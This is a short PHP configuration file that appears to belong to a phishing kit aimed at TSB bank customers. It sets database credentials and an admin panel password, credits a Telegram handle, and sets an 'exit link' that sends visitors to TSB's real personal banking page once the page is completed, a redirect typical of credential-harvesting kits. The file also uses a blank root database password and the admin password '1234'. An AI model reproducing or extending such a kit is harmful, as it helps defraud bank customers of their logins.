<?php
// made by @Kr3pto on telegram
error_reporting(0);
$servername = "localhost";
$database = "test";
$username = "root";
$password = "";

// admin panel password
$admin_panel_password = "1234"; // make sure to change this one

// exit link when errors or when page completed [i made it redirect to the login page again u can change that anytime obviously]
$exit_link = "https://www.tsb.co.uk/personal/";


?>